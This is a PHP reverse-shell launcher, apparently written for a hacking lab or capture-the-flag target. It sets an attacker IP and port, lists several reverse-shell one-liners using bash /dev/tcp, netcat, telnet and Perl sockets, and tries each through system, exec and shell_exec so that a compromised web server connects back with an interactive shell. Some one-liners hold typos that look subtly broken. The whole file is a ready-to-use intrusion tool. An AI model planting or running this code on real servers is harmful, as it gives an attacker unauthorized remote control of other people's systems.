<?php

# User config
$ip = '10.10.14.207';
$port = '9001';

$rev_shells = array(
	'/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1',
	'0<&196;exec 196<>/dev/tcp'.$ip.'/'.$port.'; /bin/sh ,&196 >&196 2>&196',
	'/usr/bin/nc '.$ip.' '.$port.' -e /bin/bash',
	'nc.exe -nv '.$ip.' '.$port.' -e cmd.exe',
	"/usr/bin/perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"".$ip.':'.$port."\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
	'rm -f /tmp/p; mknod /tmp/p p && telnet '.$ip.' '.$port.' 0/tmp/p',
	'perl -e \'use Socket;$i="'.$ip.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
);

foreach ($rev_shells as $payload){
	// Trying system
	try{
		echo system($payload);
	}
	catch(Exception $e){
		echo $e;
	}
	//Trying exec
	try{
		exec($payload);
	}
	catch(Exception $e){
		echo $e;
	}
	//trying shell_exec
	try{
		shell_exec($payload);
	}
	catch(Exception $e){
		echo $e;
	}
}

?>
